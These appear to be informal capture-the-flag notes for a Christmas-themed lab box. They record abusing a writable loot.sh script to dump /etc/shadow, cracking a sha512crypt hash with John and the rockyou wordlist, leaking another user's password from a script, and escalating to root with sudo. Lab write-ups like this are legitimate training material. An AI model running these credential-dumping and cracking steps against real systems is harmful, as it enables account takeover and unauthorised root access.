change loot.sh
cat /etc/shadow

thegrinch:$6$iiajscL7$7YgS0mCSs8ROHgS/4VP1itLix.T7onR26n4gdHFNAYnF/jVY7N4No11Yuy2RtLwXxJE3Vzl6zBdXXu5GUBJCj0:18942:0:99999:7::: 
mcskidy:$6$g81UcX1e$az/mXtNiOt9tMDb6lixDN3c1yH2GhcJVlAIWYB/WYNgujmxHafZdhD91ppxB.x7RIkH9DbpS6XQxe0piA2p2L1:18942:0:99999:7::: 
pepper:$6$GZUP42Y2$QYDESrTO9T517RDzR6cGXOANA/H4For7odahhn/DUdeWfEXtG9ZLHnZl4PLbfm8WF0GRB4ti9ij6w0NwBPunI/:18942:0:99999:7::: 




Eg
vi passwd.txt
pepper:x:1003:1003:,,,:/home/pepper:/bin/bash


vi shadow.txt
# /etc/shadow line
pepper:$6$GZUP42Y2$QYDESrTO9T517RDzR6cGXOANA/H4For7odahhn/DUdeWfEXtG9ZLHnZl4PLbfm8WF0GRB4ti9ij6w0NwBPunI/:18942:0:99999:7::: 


In order to unshadow to the two files we need to execute

unshadow passwd.txt shadow.txt > unshadowed.txt


pepper:$6$GZUP42Y2$QYDESrTO9T517RDzR6cGXOANA/H4For7odahhn/DUdeWfEXtG9ZLHnZl4PLbfm8WF0GRB4ti9ij6w0NwBPunI/:1003:1003:,,,:/home/pepper:/bin/bash


Next and final step is to actually start the cracking with John. It is up to you which cracking method you will chose, though a bruteforcing using a wordlist is usually enough for CTFs. An example attack using a wordlist would be launched like below

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pepper123        (pepper)     
1g 0:00:01:37 DONE (2021-12-14 23:43) 0.01025g/s 137.8p/s 137.8c/s 137.8C/s 120806..waiting
Use the "--show" option to display all of the cracked passwords reliably


change loot.sh
cat /home/thegrinch/Desktop/flag.txt /var/www/ls.html

DI3H4rdIsTheBestX-masMovie! 



https://erev0s.com/blog/cracking-etcshadow-john/


Privilege to root
change file loot.sh
cat /home/thegrinch/scripts/check.sh > /var/www/ls.html

#Secret password reminder script V 1.0 response=$(curl -s http://localhost/ls.html) 
content=$(echo $response > /tmp/check.txt) 
if grep "remindme.txt" /tmp/check.txt 
then echo "ELFSareFAST" > /var/www/html/pass.html 
else echo "Error" > /dev/null # rm /tmp/check.txt fi 

----> password of thegrinch: ELFSareFAST

su thegrinch
Password: 
thegrinch@ip-10-10-115-195:/tmp$ whoami
thegrinch
thegrinch@ip-10-10-115-195:/tmp$ sudo -l
[sudo] password for thegrinch: 
Matching Defaults entries for thegrinch on ip-10-10-115-195:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thegrinch may run the following commands on ip-10-10-115-195:
    (ALL : ALL) ALL
    (ALL : ALL) ALL
thegrinch@ip-10-10-115-195:/tmp$ sudo su
root@ip-10-10-115-195:/tmp# whoami
root
root@ip-10-10-115-195:/tmp# 


